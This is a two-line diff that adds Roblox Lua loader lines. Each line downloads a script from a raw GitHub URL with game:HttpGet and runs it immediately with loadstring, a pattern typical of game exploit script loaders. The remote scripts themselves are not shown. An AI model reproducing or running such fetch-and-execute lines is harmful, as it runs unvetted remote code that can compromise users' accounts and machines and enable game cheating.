@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptpastebin/raw/main/2"))()
+loadstring(game:httpget("https://raw.githubusercontent.com/gussyderd/repo-roblox-script/main/script.lua"))()
